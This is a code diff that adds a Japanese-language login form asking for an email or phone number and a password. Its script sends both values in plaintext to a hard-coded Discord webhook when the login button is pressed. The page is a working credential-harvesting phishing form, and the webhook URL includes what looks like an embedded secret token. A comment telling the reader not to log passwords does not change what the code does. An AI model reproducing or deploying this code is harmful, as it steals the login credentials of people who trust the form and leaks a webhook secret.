@@ -1,0 +1,30 @@
+<form id="loginForm">
+    <label for="email">メールアドレスまたは電話番号:</label>
+    <input type="text" id="email" name="email" required><br><br>
+    <label for="password">パスワード:</label>
+    <input type="password" id="password" name="password" required><br><br>
+    <input type="button" value="ログイン" onclick="sendData()">
+</form>
+
+<script>
+function sendData() {
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+
+    // 送信するデータ
+    var data = {
+        content: `ログイン試行: ${email}, パスワード: ${password}` // 注意: 実際にはパスワードをログに送信しないでください
+    };
+
+    fetch('https://discord.com/api/webhooks/1208601613783269376/euWVaEp1HsUWI7TqhMLRmxvEi-a86nXPcse8VSjEeYy3vLUNVvQU2J4wemeCoYP5Oe0R', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(result => console.log(result))
+    .catch(error => console.error('Error:', error));
+}
+</script>
